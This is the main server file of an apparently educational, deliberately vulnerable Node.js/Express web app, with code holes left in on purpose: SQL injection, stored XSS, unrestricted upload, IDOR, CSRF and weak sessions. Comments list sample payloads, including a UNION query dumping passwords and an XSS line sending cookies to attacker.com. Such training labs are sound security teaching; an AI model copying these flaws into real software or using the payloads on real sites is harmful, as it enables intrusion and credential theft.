/**
 * ============================================================
 *  VulnWebApp - Main Server
 *  INTENTIONALLY VULNERABLE - FOR EDUCATION ONLY
 * ============================================================
 *  Stack: Node.js + Express + SQLite + EJS
 *  
 *  Vulnerabilities included:
 *    [1] SQL Injection     - /login, /search
 *    [2] XSS              - /comments
 *    [3] File Upload      - /upload
 *    [4] Broken Auth      - plaintext passwords, weak session
 *    [5] IDOR             - /profile?id=X
 *    [6] CSRF             - /change-password (no token)
 * ============================================================
 */

const express    = require('express');
const session    = require('express-session');
const multer     = require('multer');
const path       = require('path');
const fs         = require('fs');
const Database   = require('better-sqlite3');

const app = express();
const PORT = 3000;

// Database
const DB_PATH = path.join(__dirname, '../database/vuln.db');
const db = new Database(DB_PATH);

// Init schema from SQL file if tables don't exist
const schema = fs.readFileSync(path.join(__dirname, '../database/init.sql'), 'utf8');
db.exec(schema);

// View engine 
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

// Static files 
app.use('/static', express.static(path.join(__dirname, 'public')));
app.use('/uploads', express.static(path.join(__dirname, 'public/uploads')));

// Body parsing 
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Session
// VULN [4]: Weak session config - short secret, no secure flags
app.use(session({
  secret: '123456',            // Weak secret
  resave: false,
  saveUninitialized: false,
  cookie: {
    httpOnly: false,           // Allows JS access to cookie
    maxAge: 1000 * 60 * 60 * 24
  }
}));

// File Upload Config
// VULN [3]: No file type validation whatsoever
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, path.join(__dirname, 'public/uploads'));
  },
  filename: (req, file, cb) => {
    // Keeps original filename including dangerous extensions
    cb(null, file.originalname);
  }
});
const upload = multer({ storage });

// Middleware: pass user to all views
app.use((req, res, next) => {
  res.locals.currentUser = req.session.user || null;
  next();
});

//  ROUTES

// Home 
app.get('/', (req, res) => {
  const posts = db.prepare('SELECT p.*, u.username FROM posts p JOIN users u ON p.user_id = u.id ORDER BY p.created_at DESC').all();
  res.render('index', { posts });
});

// Login 
app.get('/login', (req, res) => {
  res.render('login', { error: null });
});

app.post('/login', (req, res) => {
  const { username, password } = req.body;

  // VULN [1] SQL INJECTION: Raw string interpolation
  // Payload: username = ' OR 1=1 --
  const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
  
  console.log('[SQL] Executing:', query);   // Log query for demo purposes

  let user;
  try {
    user = db.prepare(query).get();
  } catch (err) {
    return res.render('login', { error: `SQL Error: ${err.message}` });
  }

  if (user) {
    // VULN [4]: Session stores full user object including password
    req.session.user = user;
    res.redirect('/dashboard');
  } else {
    res.render('login', { error: 'Invalid username or password.' });
  }
});

// Logout
app.get('/logout', (req, res) => {
  req.session.destroy();
  res.redirect('/');
});

// Dashboard
app.get('/dashboard', (req, res) => {
  if (!req.session.user) return res.redirect('/login');
  res.render('dashboard');
});

// Profile: IDOR
// VULN [5] IDOR: No authorization check - anyone can view any profile
// Try: /profile?id=1, /profile?id=2, /profile?id=3
app.get('/profile', (req, res) => {
  const id = req.query.id || (req.session.user ? req.session.user.id : null);
  if (!id) return res.redirect('/login');

  // No check: is the logged-in user allowed to view this profile?
  const profile = db.prepare('SELECT * FROM users WHERE id = ?').get(id);
  if (!profile) return res.status(404).render('error', { message: 'User not found.' });

  res.render('profile', { profile });
});

// Comments: XSS 
app.get('/comments', (req, res) => {
  const comments = db.prepare(
    'SELECT c.*, u.username FROM comments c JOIN users u ON c.user_id = u.id ORDER BY c.created_at DESC'
  ).all();
  res.render('comments', { comments });
});

app.post('/comments', (req, res) => {
  if (!req.session.user) return res.redirect('/login');

  const { content } = req.body;

  // VULN [2] XSS: content stored and rendered without sanitization
  // Payload: <script>alert('XSS')</script>
  // Payload: <img src=x onerror="document.location='http://attacker.com/steal?c='+document.cookie">
  db.prepare('INSERT INTO comments (user_id, content) VALUES (?, ?)').run(req.session.user.id, content);
  res.redirect('/comments');
});

// File Upload: Unrestricted Upload 
app.get('/upload', (req, res) => {
  if (!req.session.user) return res.redirect('/login');
  const files = fs.readdirSync(path.join(__dirname, 'public/uploads'));
  res.render('upload', { files, success: null, error: null });
});

app.post('/upload', upload.single('avatar'), (req, res) => {
  if (!req.session.user) return res.redirect('/login');

  // VULN [3] FILE UPLOAD: Zero validation
  // - No MIME type check
  // - No extension whitelist
  // - Original filename preserved (path traversal risk)
  // - File served statically → executable in browser context
  
  if (!req.file) {
    const files = fs.readdirSync(path.join(__dirname, 'public/uploads'));
    return res.render('upload', { files, success: null, error: 'No file uploaded.' });
  }

  const files = fs.readdirSync(path.join(__dirname, 'public/uploads'));
  res.render('upload', {
    files,
    success: `File uploaded: /uploads/${req.file.filename}`,
    error: null
  });
});

// Search: Second SQL Injection point 
app.get('/search', (req, res) => {
  const q = req.query.q || '';

  // VULN [1] SQL INJECTION (second point)
  // Try: ' UNION SELECT id,username,password,email,role,bio,avatar,created_at FROM users --
  const query = `SELECT * FROM posts WHERE title LIKE '%${q}%' OR content LIKE '%${q}%'`;
  
  console.log('[SQL] Search query:', query);

  let results = [];
  let sqlError = null;
  try {
    results = db.prepare(query).all();
  } catch (err) {
    sqlError = err.message;
  }

  res.render('search', { q, results, sqlError });
});

// Change Password: CSRF 
app.get('/change-password', (req, res) => {
  if (!req.session.user) return res.redirect('/login');
  res.render('change-password', { success: null, error: null });
});

app.post('/change-password', (req, res) => {
  if (!req.session.user) return res.redirect('/login');

  const { new_password } = req.body;

  // VULN [6] CSRF: No CSRF token validation
  // VULN [4] Broken Auth: No current password required
  db.prepare('UPDATE users SET password = ? WHERE id = ?').run(new_password, req.session.user.id);
  req.session.user.password = new_password;

  res.render('change-password', { success: 'Password changed successfully!', error: null });
});

// Debug: Show current session (for demo)
app.get('/debug/session', (req, res) => {
  // VULN: Information disclosure
  res.json({ session: req.session });
});

// 404
app.use((req, res) => {
  res.status(404).render('error', { message: '404 — Page not found.' });
});

// Start 
app.listen(PORT, () => {
  console.log('');
  console.log('╔══════════════════════════════════════════════╗');
  console.log('║   VulnWebApp is running                      ║');
  console.log('║   FOR EDUCATIONAL PURPOSES ONLY              ║');
  console.log(`║   http://localhost:${PORT}                   ║`);
  console.log('║                                              ║');
  console.log('║   Test accounts:                             ║');
  console.log('║     admin / admin123                         ║');
  console.log('║     user  / 123456                           ║');
  console.log('╚══════════════════════════════════════════════╝');
  console.log('');
});